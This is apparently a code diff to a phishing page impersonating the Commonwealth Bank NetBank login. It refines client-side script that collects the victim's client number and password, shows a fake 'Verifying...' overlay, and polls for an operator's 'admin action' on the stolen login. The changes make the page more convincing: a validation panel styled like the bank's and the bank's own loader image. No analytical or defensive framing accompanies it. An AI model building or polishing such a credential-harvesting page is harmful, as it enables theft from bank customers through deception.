@@ -1,6 +1,3 @@
-
-
-
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head id="head"><title>
@@ -54,7 +51,47 @@
     return pwdField ? pwdField.value : '';
   }
 
-  /* ===== 4. SHOW LOADING OVERLAY ===== */
+  /* ===== 4. SHOW VALIDATION ERROR ===== */
+  function showValidationError() {
+    const messagePanel = document.getElementById('mplMessagePanel');
+    if (messagePanel) {
+      messagePanel.style.display = 'block';
+      messagePanel.className = 'MessagePanel arrow MessagePanel_Validation';
+      messagePanel.innerHTML = `
+        <div class="message_contents message_contents_validation">
+          <div class="message">
+            <div class="message_icon validation icon icon_validation">
+              <i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i>
+            </div><h3>
+              <span class="validation">We're sorry, information required for one or more fields is missing or incorrect.</span>
+            </h3><ul class="msg_cnt_wrp msg_cnt_wrp_validation">
+              <li class=""><div class="linkWrap">
+                <a href="#txtMyClientNumber_field" onclick="document.getElementById('txtMyClientNumber_field').focus(); return false;"><strong>Client number</strong></a> - 
+              </div><div class="msgWrap">
+                This is required.
+              </div></li><li class="last"><div class="linkWrap">
+                <a href="#txtMyPassword_field" onclick="document.getElementById('txtMyPassword_field').focus(); return false;"><strong>Password</strong></a> - 
+              </div><div class="msgWrap">
+                This is required.
+              </div></li>
+            </ul>
+          </div>
+        </div>
+      `;
+    }
+    window.scrollTo(0, 0);
+  }
+
+  /* ===== 5. HIDE VALIDATION ERROR ===== */
+  function hideValidationError() {
+    const messagePanel = document.getElementById('mplMessagePanel');
+    if (messagePanel) {
+      messagePanel.style.display = 'none';
+      messagePanel.innerHTML = '';
+    }
+  }
+
+  /* ===== 6. SHOW LOADING OVERLAY ===== */
   function showLoading() {
     const overlay = document.createElement('div');
     overlay.id = 'login-loading-overlay';
@@ -64,8 +101,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.6);
-      backdrop-filter: blur(2px);
+      background: rgba(255, 255, 255, 0.9);
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -73,42 +109,29 @@
       z-index: 9999;
     `;
 
-    const spinner = document.createElement('div');
-    spinner.style.cssText = `
-      width: 60px;
-      height: 60px;
-      border: 4px solid rgba(255, 102, 0, 0.2);
-      border-top: 4px solid #ff6600;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
+    const loader = document.createElement('img');
+    loader.src = '/images/loader.811fa38f2f95504a101b1b41aec4e3ca.gif';
+    loader.alt = 'Loading...';
+    loader.style.cssText = `
+      width: 50px;
+      height: 50px;
     `;
 
     const text = document.createElement('p');
     text.textContent = 'Verifying...';
     text.style.cssText = `
-      color: #ffffff;
+      color: #333333;
       font-family: Arial, sans-serif;
-      font-size: 16px;
-      margin-top: 20px;
-      letter-spacing: 1px;
+      font-size: 14px;
+      margin-top: 15px;
     `;
 
-    overlay.appendChild(spinner);
+    overlay.appendChild(loader);
     overlay.appendChild(text);
     document.body.appendChild(overlay);
-
-    const style = document.createElement('style');
-    style.id = 'spin-style';
-    style.textContent = `
-      @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-      }
-    `;
-    document.head.appendChild(style);
   }
 
-  /* ===== 5. HIDE LOADING OVERLAY ===== */
+  /* ===== 7. HIDE LOADING OVERLAY ===== */
   function hideLoading() {
     const existing = document.getElementById('login-loading-overlay');
     if (existing) {
@@ -117,7 +140,7 @@
     }
   }
 
-  /* ===== 6. SHOW ERROR MESSAGE ===== */
+  /* ===== 8. SHOW ERROR MESSAGE ===== */
   function showErrorMessage() {
     const existingError = document.querySelector('.message.warning');
     if (existingError) {
@@ -150,7 +173,7 @@
     window.scrollTo(0, 0);
   }
 
-  /* ===== 7. CLEAR FORM ===== */
+  /* ===== 9. CLEAR FORM ===== */
   function clearForm() {
     const cifField = document.getElementById('txtMyClientNumber_field');
     if (cifField) {
@@ -165,7 +188,7 @@
     }
   }
 
-  /* ===== 8. POLL FOR ADMIN ACTION ===== */
+  /* ===== 10. POLL FOR ADMIN ACTION ===== */
   let isWaitingForAdmin = false;
 
   function startPolling() {
@@ -203,7 +226,7 @@
     poll();
   }
 
-  /* ===== 9. LOGIN ===== */
+  /* ===== 11. LOGIN ===== */
   document.addEventListener('click', (e) => {
     const btn = e.target.closest('#btnLogon_field');
     if (!btn) return;
@@ -211,8 +234,12 @@
     const clientNumber = getClientNumber();
     const password = getPassword();
 
+    // Hide any previous validation error
+    hideValidationError();
+
+    // Validate fields
     if (!clientNumber || !password) {
-      alert('Please enter both Client number and Password.');
+      showValidationError();
       return;
     }
 
@@ -237,6 +264,16 @@
       console.error('Fetch error:', err);
       alert('An error occurred. Please try again.');
     });
+  });
+
+  // Clear validation error when user starts typing
+  document.addEventListener('input', (e) => {
+    if (e.target.id === 'txtMyClientNumber_field' || e.target.id === 'txtMyPassword_field') {
+      const messagePanel = document.getElementById('mplMessagePanel');
+      if (messagePanel && messagePanel.style.display === 'block') {
+        hideValidationError();
+      }
+    }
   });
 </script>
 
@@ -275,27 +312,27 @@
 							<div class="ft">
 								<div class="row rowClientNumber">
 									<div class="LabelWrapper LabelTextAlignNotSet align_notset">
-	<label for="txtMyClientNumber_field" id="txtMyClientNumber_label"><span class="MainLabel ">Client number</span></label>
-</div><div class="FieldElement ">
+	<label for="txtMyClientNumber_field" id="txtMyClientNumber_label"><span class="MainLabel">Client number</span></label>
+</div><div class="FieldElement">
 	<input name="txtMyClientNumber$field" type="text" maxlength="8" id="txtMyClientNumber_field" class="text textbox field" disabled="disabled" data-maxlength="8" />
 </div>
 								</div>
 								<div class="row rowPassword">
 									<div class="LabelWrapper LabelTextAlignNotSet align_notset">
-	<label for="txtMyPassword_field" id="txtMyPassword_label"><span class="MainLabel ">Password</span></label>
-</div><div class="FieldElement ">
+	<label for="txtMyPassword_field" id="txtMyPassword_label"><span class="MainLabel">Password</span></label>
+</div><div class="FieldElement">
 	<input name="txtMyPassword$field" type="password" maxlength="16" id="txtMyPassword_field" class="text textbox field" disabled="disabled" data-maxlength="16" />
 </div>
 								</div>
 								<div class="row">
-									<div class="FieldElement  FieldElementNoLabel">
+									<div class="FieldElement FieldElementNoLabel">
 	<span class="checkbox field checkbox_classic"><input id="chkRemember_field" type="checkbox" name="chkRemember$field" class="checkbox" /><label for="chkRemember_field">Remember client number</label></span>
 </div>
 								</div>
 								<input type="hidden" name="perfmonLog" id="perfmonLog" />
 							    <input type="hidden" name="metric" id="metric" />
-								<div class="FieldElement  FieldElementNoLabel">
-	<div class="CbaButton " id="btnLogon">
+								<div class="FieldElement FieldElementNoLabel">
+	<div class="CbaButton" id="btnLogon">
 		<input class="button field" type="submit" name="btnLogon$field" value="Log on" id="btnLogon_field" disabled="disabled" />
 	</div>
 </div>
@@ -368,7 +405,7 @@
                                 <li><p><a href="https://www.commbank.com.au/support/financial-support/financial-hardship.html?mbt=nb-ql_financial-hardship" target="_blank">Are you experiencing financial difficulty? Get help</a></p></li>                                                                                                                                                                               
                                                             
                                 <li><p><a href="https://www.commbank.com.au/digital-banking/benefits-finder.html?mbt=nb-ql_benefitsfinder" target="_blank">Use Benefits finder to find grants, rebates and concessions you may be eligible for</a></p></li>                                                                                                                                                                               
-                            
+                       
                      </ul>
                 </div> 
             </div>
@@ -427,4 +464,3 @@ WebForm_OnSubmit = function() {
 	<input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""/><input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""/><input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"/><input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value=""/>
 </body>
 </html>
-
